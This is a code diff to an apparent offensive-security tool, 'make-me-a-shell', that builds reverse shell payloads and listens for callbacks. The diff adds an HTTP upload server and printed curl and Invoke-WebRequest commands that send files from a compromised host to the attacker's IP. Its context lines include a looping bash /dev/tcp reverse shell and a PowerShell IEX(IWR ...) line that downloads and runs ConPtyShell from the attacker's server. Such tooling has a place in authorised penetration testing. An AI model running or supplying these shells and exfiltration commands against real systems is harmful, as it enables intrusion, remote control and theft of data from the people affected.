@@ -13,9 +13,69 @@ import tty
 import termios
 import base64
 import urllib.parse
+import http.server
+import socketserver
+import re
+from pathlib import Path
 from datetime import datetime
 
 SIOCGIFADDR = 0x8915
+
+class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+    """
+    Custom HTTP request handler that serves files via GET and accepts file uploads via POST.
+    """
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory='/usr/share/make-me-a-shell', **kwargs)
+
+    def do_GET(self):
+        """Handle GET requests to serve files (e.g., ConPtyShell.ps1)."""
+        super().do_GET()
+
+    def do_POST(self):
+        """Handle POST requests to upload files."""
+        try:
+            # Read the content length
+            content_length = int(self.headers.get('Content-Length', 0))
+
+            # Read the file data
+            file_data = self.rfile.read(content_length)
+
+            # Generate filename with timestamp
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            filename = f"upload_{timestamp}"
+
+            # Try to extract filename from Content-Disposition header if present
+            content_disposition = self.headers.get('Content-Disposition', '')
+            if 'filename=' in content_disposition:
+                # Extract filename from Content-Disposition header
+                match = re.search(r'filename[^;=\n]*=(([\'"]).*?\2|[^;\n]*)', content_disposition)
+                if match:
+                    extracted_filename = match.group(1).strip('"\'')
+                    # Use the extracted filename, but sanitize it
+                    filename = os.path.basename(extracted_filename) or filename
+
+            # Save the file to current directory
+            save_path = Path(filename)
+            with open(save_path, 'wb') as f:
+                f.write(file_data)
+
+            # Send success response
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            response_message = f"File saved as: {save_path.absolute()}\n"
+            self.wfile.write(response_message.encode('utf-8'))
+
+            print(f"\nFile received and saved as: {save_path.absolute()} ({len(file_data)} bytes)")
+
+        except Exception as e:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            error_message = f"Error: {str(e)}\n"
+            self.wfile.write(error_message.encode('utf-8'))
+            print(f"\nError handling request: {e}")
 
 def get_ip_address(interface):
     try:
@@ -34,7 +94,9 @@ def get_ip_address(interface):
 def create_reverse_shell(ip, port, os, encode, http_server_port, auto_upgrade):
     if os == 'linux':
         reverse_shell_cmd = f"bash -c 'while true; do bash -i >& /dev/tcp/{ip}/{port} 0>&1 || exit; sleep 1; done'"
+        upload_cmd = f"curl -X POST --data-binary @file.txt http://{ip}:{http_server_port}/"
     elif os == 'windows':
+        upload_cmd = f"Invoke-WebRequest -Uri http://{ip}:{http_server_port}/ -Method Post -InFile file.txt"
         if auto_upgrade:
             reverse_shell_cmd = f"{ip} {port}"
         else:
@@ -44,6 +106,7 @@ def create_reverse_shell(ip, port, os, encode, http_server_port, auto_upgrade):
     elif encode == 'url':
         reverse_shell_cmd = urllib.parse.quote(reverse_shell_cmd)
     print(f"Reverse shell command:\n{reverse_shell_cmd}")
+    print(f"Upload command:\n{upload_cmd}")
 
 class ConnectionLogger:
     """
@@ -140,16 +203,22 @@ def windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port
         conn.sendall(f"IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell -Upgrade -Rows 38 -Cols 116\n".encode())
     shell(conn, exit_the_whole_thing, logger)
 
-def start_http_server(port):
-      # Start a simple HTTP server to serve PowerShell Empire files
-      http_server_thread = threading.Thread(target=lambda: os.system(f'cd /usr/share/make-me-a-shell && python3 -m http.server {port}'))
+def start_http_server(port, ip):
+      """Start HTTP server that serves files via GET and accepts file uploads via POST."""
+      def run_server():
+          try:
+              with socketserver.TCPServer(("", port), CustomHTTPRequestHandler) as httpd:
+                  httpd.serve_forever()
+          except Exception as e:
+              print(f"Error starting HTTP server: {e}")
+
+      http_server_thread = threading.Thread(target=run_server)
       http_server_thread.daemon = True
       http_server_thread.start()
-      print(f"Started HTTP server on port {port} serving ConPtyShell")
 
 def listen_for_connection(port, os, http_server_port, ip, auto_upgrade):
-    if os == 'windows':
-        start_http_server(http_server_port)
+    # Start HTTP server for both Windows and Linux to enable file uploads
+    start_http_server(http_server_port, ip)
 
     # Use socket to listen for incoming connections
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
